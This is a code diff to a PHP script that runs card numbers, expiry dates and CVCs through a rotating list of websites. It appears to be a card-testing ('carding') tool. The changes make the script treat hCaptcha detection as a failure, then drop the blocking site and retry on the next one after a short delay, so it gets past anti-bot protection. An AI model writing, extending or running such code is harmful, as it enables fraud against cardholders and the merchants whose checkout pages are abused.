@@ -71,7 +71,7 @@ function checkCard($site, $card_number, $exp_month, $exp_year, $cvc, $retry = 1)
         } elseif (in_array($response_text, [
             'CARD_DECLINED', 'FRAUD_SUSPECTED', 'r4 token empty', 'tax amount empty', 'del amount empty',
             'INCORRECT_NUMBER', 'product id empty', 'py id empty', 'clinte token', 'EXPIRED_CARD',
-            'INVALID_PAYMENT_ERROR', 'AUTHORIZATION_ERROR', 'PROCESSING_ERROR'
+            'INVALID_PAYMENT_ERROR', 'AUTHORIZATION_ERROR', 'PROCESSING_ERROR', 'HCAPTCHA DETECTED'
         ])) {
             $status = 'DECLINED';
         }
@@ -174,19 +174,19 @@ if (empty($available_sites)) {
     exit;
 }
 
-// Process card with one site at a time, switching on error
+// Process card with one site at a time, switching on error or HCAPTCHA DETECTED
 $site_index = 0;
 while ($site_index < count($available_sites)) {
     $site = filter_var($available_sites[$site_index], FILTER_SANITIZE_URL);
     if (!filter_var($site, FILTER_VALIDATE_URL)) {
         log_message("Invalid site URL: $site");
-        $site_index++;
+        array_splice($available_sites, $site_index, 1); // Remove invalid site
         continue; // Skip invalid URLs
     }
 
     $result = checkCard($site, $card_number, $exp_month, $exp_year, $cvc);
-    if ($result['status'] !== 'DECLINED' || !preg_match('/Invalid API response|API request failed/', $result['message'])) {
-        // Return result if it's not a DECLINED due to API error
+    if ($result['status'] !== 'DECLINED' || !preg_match('/Invalid API response|API request failed|HCAPTCHA DETECTED/', $result['message'])) {
+        // Return result if it's not a DECLINED due to API error or HCAPTCHA
         echo json_encode([
             'status' => $result['status'],
             'message' => $result['message'],
@@ -196,8 +196,8 @@ while ($site_index < count($available_sites)) {
         exit;
     }
 
-    // If DECLINED due to API error, remove the failed site and try the next one
-    log_message("Site $site failed for $card_number, removing and trying next site...");
+    // If DECLINED due to API error or HCAPTCHA DETECTED, remove the failed site and try the next one
+    log_message("Site $site failed for $card_number with message: {$result['message']}, removing and trying next site...");
     array_splice($available_sites, $site_index, 1); // Remove failed site
     usleep(500000); // 0.5s delay before trying next site
 }
